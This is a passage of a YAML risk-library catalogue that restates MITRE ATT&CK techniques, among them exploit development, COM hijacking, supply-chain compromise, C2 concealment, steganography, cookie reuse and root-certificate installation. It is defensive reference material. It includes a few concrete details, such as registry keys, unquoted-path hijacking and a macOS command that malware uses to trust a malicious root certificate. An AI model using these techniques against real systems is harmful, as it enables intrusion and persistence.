      An exploit takes advantage of a bug or vulnerability in order to cause unintended
      or unanticipated behavior to occur on computer hardware or software. Rather
      than finding/modifying exploits from online or purchasing them from exploit
      vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet)
      Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006)
      to focus exploit development efforts. As part of the exploit development process,
      adversaries may uncover exploitable vulnerabilities through methods such as
      fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)


      As with legitimate development efforts, different skill sets may be required
      for developing exploits. The skills needed may be located in-house, or may need
      to be contracted out. Use of a contractor may be considered an extension of
      that adversary''s exploit development capabilities, provided the adversary plays
      a role in shaping requirements and maintains an initial degree of exclusivity
      to the exploit.


      Adversaries may use exploits during various phases of the adversary lifecycle
      (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190),
      [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203),
      [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068),
      [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211),
      [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212),
      [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210),
      and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).

      https://attack.mitre.org/techniques/T1587/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1593.001
    ref_id: T1593.001
    name: Social Media
    description: "Adversaries may search social media for information about victims\
      \ that can be used during targeting. Social media sites may contain various\
      \ information about a victim organization, such as business announcements as\
      \ well as information about the roles, locations, and interests of staff.\n\n\
      Adversaries may search in different social media sites depending on what information\
      \ they seek to gather. Threat actors may passively harvest data from these sites,\
      \ as well as use information gathered to create fake profiles/groups to elicit\
      \ victim\u2019s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation:\
      \ Cyware Social Media) Information from these sources may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),\
      \ establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)\
      \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or\
      \ initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).\n\
      https://attack.mitre.org/techniques/T1593/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.004
    ref_id: T1213.004
    name: Customer Relationship Management Software
    description: "Adversaries may leverage Customer Relationship Management (CRM)\
      \ software to mine valuable information. CRM software is used to assist organizations\
      \ in tracking and managing customer interactions, as well as storing customer\
      \ data.\n\nOnce adversaries gain access to a victim organization, they may mine\
      \ CRM software for customer data. This may include personally identifiable information\
      \ (PII) such as full names, emails, phone numbers, and addresses, as well as\
      \ additional details such as purchase histories and IT support interactions.\
      \ By collecting this data, an adversary may be able to send personalized [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ emails, engage in SIM swapping, or otherwise target the organization\u2019\
      s customers in ways that enable financial gain or the compromise of additional\
      \ organizations.(Citation: Bleeping Computer US Cellular Hack 2022)(Citation:\
      \ Bleeping Computer Mint Mobile Hack 2021)(Citation: Bleeping Computer Bank\
      \ Hack 2020)\n\nCRM software may be hosted on-premises or in the cloud. Information\
      \ stored in these solutions may vary based on the specific instance or environment.\
      \ Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho,\
      \ Zendesk, and HubSpot.\nhttps://attack.mitre.org/techniques/T1213/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.015
    ref_id: T1546.015
    name: Component Object Model Hijacking
    description: "Adversaries may establish persistence by executing malicious content\
      \ triggered by hijacked references to Component Object Model (COM) objects.\
      \ COM is a system within Windows to enable interaction between software components\
      \ through the operating system.(Citation: Microsoft Component Object Model)\
      \  References to various COM objects are stored in the Registry. \n\nAdversaries\
      \ can use the COM system to insert malicious code that can be executed in place\
      \ of legitimate software through hijacking the COM references and relationships\
      \ as a means for persistence. Hijacking a COM object requires a change in the\
      \ Registry to replace a reference to a legitimate system component which may\
      \ cause that component to not work when executed. When that system component\
      \ is executed through normal system operation the adversary's code will be executed\
      \ instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects\
      \ that are used frequently enough to maintain a consistent level of persistence,\
      \ but are unlikely to break noticeable functionality within the system as to\
      \ avoid system instability that could lead to detection.\nhttps://attack.mitre.org/techniques/T1546/015"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1589.001
    ref_id: T1589.001
    name: Credentials
    description: 'Adversaries may gather credentials that can be used during targeting.
      Account credentials gathered by adversaries may be those directly associated
      with the target victim organization or attempt to take advantage of the tendency
      for users to use the same passwords across personal and business accounts.


      Adversaries may gather credentials from potential victims in various ways, such
      as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598).
      Adversaries may also compromise sites then add malicious content designed to
      collect website authentication cookies from visitors.(Citation: ATT ScanBox)
      (Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack
      Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation:
      GitHub Gitrob)(Citation: CNET Leaks) Where multi-factor authentication (MFA)
      based on out-of-band communications is in use, adversaries may compromise a
      service provider to gain access to MFA codes and one-time passwords (OTP).(Citation:
      Okta Scatter Swine 2022)


      Credential information may also be exposed to adversaries via leaks to online
      or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002),
      breach dumps, code repositories, etc.). Adversaries may purchase credentials
      from dark web markets, such as Russian Market and 2easy, or through access to
      Telegram channels that distribute logs from infostealer malware.(Citation: Bleeping
      Computer 2easy 2021)(Citation: SecureWorks Infostealers 2023)(Citation: Bleeping
      Computer Stealer Logs 2023)


      Gathering this information may reveal opportunities for other forms of reconnaissance
      (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

      https://attack.mitre.org/techniques/T1589/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1195.002
    ref_id: T1195.002
    name: Compromise Software Supply Chain
    description: 'Adversaries may manipulate application software prior to receipt
      by a final consumer for the purpose of data or system compromise. Supply chain
      compromise of software can take place in a number of ways, including manipulation
      of the application source code, manipulation of the update/distribution mechanism
      for that software, or replacing compiled releases with a modified version.


      Targeting may be specific to a desired victim set or may be distributed to a
      broad set of consumers but only move on to additional tactics on specific victims.(Citation:
      Avast CCleaner3 2018)(Citation: Command Five SK 2011)

      https://attack.mitre.org/techniques/T1195/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.003
    ref_id: T1036.003
    name: Rename System Utilities
    description: 'Adversaries may rename legitimate system utilities to try to evade
      security mechanisms concerning the usage of those utilities. Security monitoring
      and control mechanisms may be in place for system utilities adversaries are
      capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass
      those security mechanisms by renaming the utility prior to utilization (ex:
      rename <code>rundll32.exe</code>). (Citation: Elastic Masquerade Ball) An alternative
      case occurs when a legitimate utility is copied or moved to a different directory
      and renamed to avoid detections based on system utilities executing from non-standard
      paths. (Citation: F-Secure CozyDuke)

      https://attack.mitre.org/techniques/T1036/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1102.002
    ref_id: T1102.002
    name: Bidirectional Communication
    description: "Adversaries may use an existing, legitimate external Web service\
      \ as a means for sending commands to and receiving output from a compromised\
      \ system over the Web service channel. Compromised systems may leverage popular\
      \ websites and social media to host command and control (C2) instructions. Those\
      \ infected systems can then send the output from those commands back over that\
      \ Web service channel. The return traffic may occur in a variety of ways, depending\
      \ on the Web service being utilized. For example, the return traffic may take\
      \ the form of the compromised system posting a comment on a forum, issuing a\
      \ pull request to development project, updating a document hosted on a Web service,\
      \ or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism\
      \ for C2 may give a significant amount of cover due to the likelihood that hosts\
      \ within a network are already communicating with them prior to a compromise.\
      \ Using common services, such as those offered by Google or Twitter, makes it\
      \ easier for adversaries to hide in expected noise. Web service providers commonly\
      \ use SSL/TLS encryption, giving adversaries an added level of protection.\n\
      https://attack.mitre.org/techniques/T1102/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1203
    ref_id: T1203
    name: Exploitation for Client Execution
    description: 'Adversaries may exploit software vulnerabilities in client applications
      to execute code. Vulnerabilities can exist in software due to unsecure coding
      practices that can lead to unanticipated behavior. Adversaries can take advantage
      of certain vulnerabilities through targeted exploitation for the purpose of
      arbitrary code execution. Oftentimes the most valuable exploits to an offensive
      toolkit are those that can be used to obtain code execution on a remote system
      because they can be used to gain access to that system. Users will expect to
      see files related to the applications they commonly used to do work, so they
      are a useful target for exploit research and development because of their high
      utility.


      Several types exist:


      ### Browser-based Exploitation


      Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)
      and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint
      systems may be compromised through normal web browsing or from certain users
      being targeted by links in spearphishing emails to adversary controlled sites
      used to exploit the web browser. These often do not require an action by the
      user for the exploit to be executed.


      ### Office Applications


      Common office and productivity applications such as Microsoft Office are also
      targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious
      files will be transmitted directly as attachments or through links to download
      them. These require the user to open the document or file for the exploit to
      run.


      ### Common Third-party Applications


      Other applications that are commonly seen or are part of the software deployed
      in a target network may also be used for exploitation. Applications such as
      Adobe Reader and Flash, which are common in enterprise environments, have been
      routinely targeted by adversaries attempting to gain access to systems. Depending
      on the software and nature of the vulnerability, some may be exploited in the
      browser or require the user to open a file. For instance, some Flash exploits
      have been delivered as objects within Microsoft Office documents.

      https://attack.mitre.org/techniques/T1203'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1595.003
    ref_id: T1595.003
    name: Wordlist Scanning
    description: "Adversaries may iteratively probe infrastructure using brute-forcing\
      \ and crawling techniques. While this technique employs similar methods to [Brute\
      \ Force](https://attack.mitre.org/techniques/T1110), its goal is the identification\
      \ of content and infrastructure rather than the discovery of valid credentials.\
      \ Wordlists used in these scans may contain generic, commonly used names and\
      \ file extensions or terms specific to a particular software. Adversaries may\
      \ also create custom, target-specific wordlists using data gathered from other\
      \ Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591),\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\n\
      \nFor example, adversaries may use web content discovery tools such as Dirb,\
      \ DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019\
      s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can\
      \ help them to discover old, vulnerable pages or hidden administrative portals\
      \ that could become the target of further operations (ex: [Exploit Public-Facing\
      \ Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).\
      \  \n\nAs cloud storage solutions typically use globally unique names, adversaries\
      \ may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute\
      \ to enumerate public and private buckets on cloud infrastructure.(Citation:\
      \ S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered,\
      \ adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530)\
      \ to access valuable information that can be exfiltrated or used to escalate\
      \ privileges and move laterally.\nhttps://attack.mitre.org/techniques/T1595/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.011
    ref_id: T1562.011
    name: Spoof Security Alerting
    description: "Adversaries may spoof security alerting from tools, presenting false\
      \ evidence to impair defenders\u2019 awareness of malicious activity.(Citation:\
      \ BlackBasta) Messages produced by defensive tools contain information about\
      \ potential security events as well as the functioning status of security software\
      \ and the system. Security reporting messages are important for monitoring the\
      \ normal operation of a system and identifying important events that can signal\
      \ a security incident.\n\nRather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006),\
      \ an adversary can spoof positive affirmations that security tools are continuing\
      \ to function even after legitimate security tools have been disabled (e.g.,\
      \ [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)).\
      \ An adversary can also present a \u201Chealthy\u201D system status even after\
      \ infection. This can be abused to enable further malicious activity by delaying\
      \ defender responses.\n\nFor example, adversaries may show a fake Windows Security\
      \ GUI and tray icon with a \u201Chealthy\u201D system status after Windows Defender\
      \ and other system tools have been disabled.(Citation: BlackBasta)\nhttps://attack.mitre.org/techniques/T1562/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.004
    ref_id: T1137.004
    name: Outlook Home Page
    description: "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain\
      \ persistence on a compromised system. Outlook Home Page is a legacy feature\
      \ used to customize the presentation of Outlook folders. This feature allows\
      \ for an internal or external URL to be loaded and presented whenever a folder\
      \ is opened. A malicious HTML page can be crafted that will execute code when\
      \ loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n\nOnce\
      \ malicious home pages have been added to the user\u2019s mailbox, they will\
      \ be loaded when Outlook is started. Malicious Home Pages will execute when\
      \ the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home\
      \ Page)\nhttps://attack.mitre.org/techniques/T1137/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1573.002
    ref_id: T1573.002
    name: Asymmetric Cryptography
    description: "Adversaries may employ a known asymmetric encryption algorithm to\
      \ conceal command and control traffic rather than relying on any inherent protections\
      \ provided by a communication protocol. Asymmetric cryptography, also known\
      \ as public key cryptography, uses a keypair per party: one public that can\
      \ be freely distributed, and one private. Due to how the keys are generated,\
      \ the sender encrypts data with the receiver\u2019s public key and the receiver\
      \ decrypts the data with their private key. This ensures that only the intended\
      \ recipient can read the encrypted data. Common public key encryption algorithms\
      \ include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS)\
      \ use symmetric cryptography once a connection is established, but use asymmetric\
      \ cryptography to establish or transmit a key. As such, these protocols are\
      \ classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).\n\
      https://attack.mitre.org/techniques/T1573/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1567.002
    ref_id: T1567.002
    name: Exfiltration to Cloud Storage
    description: 'Adversaries may exfiltrate data to a cloud storage service rather
      than over their primary command and control channel. Cloud storage services
      allow for the storage, edit, and retrieval of data from a remote cloud storage
      server over the Internet.


      Examples of cloud storage services include Dropbox and Google Docs. Exfiltration
      to these cloud storage services can provide a significant amount of cover to
      the adversary if hosts within the network are already communicating with the
      service.

      https://attack.mitre.org/techniques/T1567/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1570
    ref_id: T1570
    name: Lateral Tool Transfer
    description: 'Adversaries may transfer tools or other files between systems in
      a compromised environment. Once brought into the victim environment (i.e., [Ingress
      Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be
      copied from one system to another to stage adversary tools or other files over
      the course of an operation.


      Adversaries may copy files between internal victim systems to support lateral
      movement using inherent file sharing protocols such as file sharing over [SMB/Windows
      Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network
      shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation:
      Unit42 LockerGoga 2019)


      Files can also be transferred using native or otherwise present tools on the
      victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095).
      In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s
      such as Dropbox or OneDrive to copy files from one machine to another via shared,
      automatically synced folders.(Citation: Dropbox Malware Sync)

      https://attack.mitre.org/techniques/T1570'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.009
    ref_id: T1574.009
    name: Path Interception by Unquoted Path
    description: 'Adversaries may execute their own malicious payloads by hijacking
      vulnerable file path references. Adversaries can take advantage of paths that
      lack surrounding quotations by placing an executable in a higher level directory
      within the path, so that Windows will choose the adversary''s executable to
      launch.


      Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut
      paths may also be vulnerable to path interception if the path has one or more
      spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path
      with space\program.exe</code> vs. <code>"C:\safe path with space\program.exe"</code>).
      (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An
      adversary can place an executable in a higher level directory of the path, and
      Windows will resolve that executable instead of the intended executable. For
      example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>,
      an adversary may create a program at <code>C:\program.exe</code> that will be
      run instead of the intended program. (Citation: Windows Unquoted Services) (Citation:
      Windows Privilege Escalation Guide)


      This technique can be used for persistence if executables are called on a regular
      basis, as well as privilege escalation if intercepted executables are started
      by a higher privileged process.

      https://attack.mitre.org/techniques/T1574/009'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1608.003
    ref_id: T1608.003
    name: Install Digital Certificate
    description: "Adversaries may install SSL/TLS certificates that can be used during\
      \ targeting. SSL/TLS certificates are files that can be installed on servers\
      \ to enable secure communications between systems. Digital certificates include\
      \ information about the key, information about its owner's identity, and the\
      \ digital signature of an entity that has verified the certificate's contents\
      \ are correct. If the signature is valid, and the person examining the certificate\
      \ trusts the signer, then they know they can use that key to communicate securely\
      \ with its owner. Certificates can be uploaded to a server, then the server\
      \ can be configured to use the certificate to enable encrypted communication\
      \ with it.(Citation: DigiCert Install SSL Cert)\n\nAdversaries may install SSL/TLS\
      \ certificates that can be used to further their operations, such as encrypting\
      \ C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)\
      \ with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending\
      \ credibility to a credential harvesting site. Installation of digital certificates\
      \ may take place for a number of server types, including web servers and email\
      \ servers. \n\nAdversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004))\
      \ or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)).\
      \ Digital certificates can then be installed on adversary controlled infrastructure\
      \ that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583))\
      \ or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).\n\
      https://attack.mitre.org/techniques/T1608/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037.005
    ref_id: T1037.005
    name: Startup Items
    description: "Adversaries may use startup items automatically executed at boot\
      \ initialization to establish persistence. Startup items execute during the\
      \ final phase of the boot process and contain shell scripts or other executable\
      \ files along with configuration information used by the system to determine\
      \ the execution order for all startup items.(Citation: Startup Items)\n\nThis\
      \ is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)),\
      \ and thus the appropriate folder, <code>/Library/StartupItems</code> isn\u2019\
      t guaranteed to exist on the system by default, but does appear to exist by\
      \ default on macOS Sierra. A startup item is a directory whose executable and\
      \ configuration property list (plist), <code>StartupParameters.plist</code>,\
      \ reside in the top-level directory. \n\nAn adversary can create the appropriate\
      \ folders/files in the StartupItems directory to register their own persistence\
      \ mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since\
      \ StartupItems run during the bootup phase of macOS, they will run as the elevated\
      \ root user.\nhttps://attack.mitre.org/techniques/T1037/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1614.001
    ref_id: T1614.001
    name: System Language Discovery
    description: "Adversaries may attempt to gather information about the system language\
      \ of a victim in order to infer the geographical location of that host. This\
      \ information may be used to shape follow-on behaviors, including whether the\
      \ adversary infects the target and/or attempts specific actions. This decision\
      \ may be employed by malware developers and operators to reduce their risk of\
      \ attracting the attention of specific law enforcement agencies or prosecution/scrutiny\
      \ from other entities.(Citation: Malware System Language Check)\n\nThere are\
      \ various sources of data an adversary could use to infer system language, such\
      \ as system defaults and keyboard layouts. Specific checks will vary based on\
      \ the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012)\
      \ and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation:\
      \ CrowdStrike Ryuk January 2019) \n\nFor example, on a Windows system adversaries\
      \ may attempt to infer the language of a system by querying the registry key\
      \ <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code>\
      \ or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>,\
      \ <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code>\
      \ and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation:\
      \ Securelist JSWorm)(Citation: SecureList SynAck Doppelg\xE4nging May 2018)\n\
      \nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve\
      \ the value of the <code>$LANG</code> environment variable.\nhttps://attack.mitre.org/techniques/T1614/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1095
    ref_id: T1095
    name: Non-Application Layer Protocol
    description: 'Adversaries may use an OSI non-application layer protocol for communication
      between host and C2 server or among infected hosts within a network. The list
      of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples
      include use of network layer protocols, such as the Internet Control Message
      Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol
      (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled
      protocols, such as Serial over LAN (SOL).


      ICMP communication between hosts is one example.(Citation: Cisco Synful Knock
      Evolution) Because ICMP is part of the Internet Protocol Suite, it is required
      to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However,
      it is not as commonly monitored as other Internet Protocols such as TCP or UDP
      and may be used by adversaries to hide communications.

      https://attack.mitre.org/techniques/T1095'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.003
    ref_id: T1027.003
    name: Steganography
    description: "Adversaries may use steganography techniques in order to prevent\
      \ the detection of hidden information. Steganographic techniques can be used\
      \ to hide data in digital media such as images, audio tracks, video clips, or\
      \ text files.\n\n[Duqu](https://attack.mitre.org/software/S0038) was an early\
      \ example of malware that used steganography. It encrypted the gathered information\
      \ from a victim's system and hid it within an image before exfiltrating the\
      \ image to a C2 server.(Citation: Wikipedia Duqu) \n\nBy the end of 2017, a\
      \ threat group used\u202F<code>Invoke-PSImage</code>\u202Fto hide [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ commands in an image file (.png) and execute the code on a victim's system.\
      \ In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ code downloaded another obfuscated script to gather intelligence from the\
      \ victim's machine and communicate it back to the adversary.(Citation: McAfee\
      \ Malicious Doc Targets Pyeongchang Olympics)\nhttps://attack.mitre.org/techniques/T1027/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.002
    ref_id: T1584.002
    name: DNS Server
    description: 'Adversaries may compromise third-party DNS servers that can be used
      during targeting. During post-compromise activity, adversaries may utilize DNS
      traffic for various tasks, including for Command and Control (ex: [Application
      Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting
      up their own DNS servers, adversaries may compromise third-party DNS servers
      in support of operations.


      By compromising DNS servers, adversaries can alter DNS records. Such control
      can allow for redirection of an organization''s traffic, facilitating Collection
      and Credential Access efforts for the adversary.(Citation: Talos DNSpionage
      Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may
      leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)
      to redirect traffic to adversary-controlled infrastructure, mimicking normal
      trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation:
      Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create
      subdomains pointed at malicious servers without tipping off the actual owner
      of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)

      https://attack.mitre.org/techniques/T1584/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1001.003
    ref_id: T1001.003
    name: Protocol or Service Impersonation
    description: "Adversaries may impersonate legitimate protocols or web service\
      \ traffic to disguise command and control activity and thwart analysis efforts.\
      \ By impersonating legitimate protocols or web services, adversaries can make\
      \ their command and control traffic blend in with legitimate network traffic.\
      \  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look\
      \ like subsequent traffic is SSL/TLS encrypted, potentially interfering with\
      \ some security tooling, or to make the traffic look like it is related with\
      \ a trusted entity. \n\nAdversaries may also leverage legitimate protocols to\
      \ impersonate expected web traffic or trusted services. For example, adversaries\
      \ may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted\
      \ data to disguise C2 communications or mimic legitimate services such as Gmail,\
      \ Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation:\
      \ Malleable-C2-U42)\nhttps://attack.mitre.org/techniques/T1001/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1012
    ref_id: T1012
    name: Query Registry
    description: 'Adversaries may interact with the Windows Registry to gather information
      about the system, configuration, and installed software.


      The Registry contains a significant amount of information about the operating
      system, configuration, software, and security.(Citation: Wikipedia Windows Registry)
      Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075)
      utility, though other means to access the Registry exist. Some of the information
      may help adversaries to further their operation within a network. Adversaries
      may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.

      https://attack.mitre.org/techniques/T1012'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1030
    ref_id: T1030
    name: Data Transfer Size Limits
    description: 'An adversary may exfiltrate data in fixed size chunks instead of
      whole files or limit packet sizes below certain thresholds. This approach may
      be used to avoid triggering network data transfer threshold alerts.

      https://attack.mitre.org/techniques/T1030'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1550.004
    ref_id: T1550.004
    name: Web Session Cookie
    description: 'Adversaries can use stolen session cookies to authenticate to web
      applications and services. This technique bypasses some multi-factor authentication
      protocols since the session is already authenticated.(Citation: Pass The Cookie)


      Authentication cookies are commonly used in web applications, including cloud-based
      services, after a user has authenticated to the service so credentials are not
      passed and re-authentication does not need to occur as frequently. Cookies are
      often valid for an extended period of time, even if the web application is not
      actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)
      or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary
      may then import the cookie into a browser they control and is then able to use
      the site or application as the user for as long as the session cookie is active.
      Once logged into the site, an adversary can access sensitive information, read
      email, or perform actions that the victim account has permissions to perform.


      There have been examples of malware targeting session cookies to bypass multi-factor
      authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)

      https://attack.mitre.org/techniques/T1550/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078.002
    ref_id: T1078.002
    name: Domain Accounts
    description: 'Adversaries may obtain and abuse credentials of a domain account
      as a means of gaining Initial Access, Persistence, Privilege Escalation, or
      Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those
      managed by Active Directory Domain Services where access and permissions are
      configured across systems and services that are part of that domain. Domain
      accounts can cover users, administrators, and services.(Citation: Microsoft
      AD Accounts)


      Adversaries may compromise domain accounts, some with a high level of privileges,
      through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      or password reuse, allowing access to privileged resources of the domain.

      https://attack.mitre.org/techniques/T1078/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.009
    ref_id: T1218.009
    name: Regsvcs/Regasm
    description: 'Adversaries may abuse Regsvcs and Regasm to proxy execution of code
      through a trusted Windows utility. Regsvcs and Regasm are Windows command-line
      utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001)
      (COM) assemblies. Both are binaries that may be digitally signed by Microsoft.
      (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)


      Both utilities may be used to bypass application control through use of attributes
      within the binary to specify code that should be run before registration or
      unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code>
      respectively. The code with the registration and unregistration attributes will
      be executed even if the process is run under insufficient privileges and fails
      to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)

      https://attack.mitre.org/techniques/T1218/009'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.004
    ref_id: T1553.004
    name: Install Root Certificate
    description: 'Adversaries may install a root certificate on a compromised system
      to avoid warnings when connecting to adversary controlled web servers. Root
      certificates are used in public key cryptography to identify a root certificate
      authority (CA). When a root certificate is installed, the system or application
      will trust certificates in the root''s chain of trust that have been signed
      by the root certificate.(Citation: Wikipedia Root Certificate) Certificates
      are commonly used for establishing secure TLS/SSL communications within a web
      browser. When a user attempts to browse a website that presents a certificate
      that is not trusted an error message will be displayed to warn the user of the
      security risk. Depending on the security settings, the browser may not allow
      the user to establish a connection to the website.


      Installation of a root certificate on a compromised system would give an adversary
      a way to degrade the security of that system. Adversaries have used this technique
      to avoid security warnings prompting users when compromised systems connect
      over HTTPS to adversary controlled web servers that spoof legitimate websites
      in order to collect login credentials.(Citation: Operation Emmental)


      Atypical root certificates have also been pre-installed on systems by the manufacturer
      or in the software supply chain and were used in conjunction with malware/adware
      to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      capability for intercepting information transmitted over secure TLS/SSL communications.(Citation:
      Kaspersky Superfish)


      Root certificates (and their associated chains) can also be cloned and reinstalled.
      Cloned certificate chains will carry many of the same metadata characteristics
      of the source and can be used to sign malicious code that may then bypass signature
      validation tools (ex: Sysinternals, antivirus, etc.) used to block execution
      and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec
      2017)


      In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert
      -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code>
      to install a malicious certificate as a trusted root certificate into the system
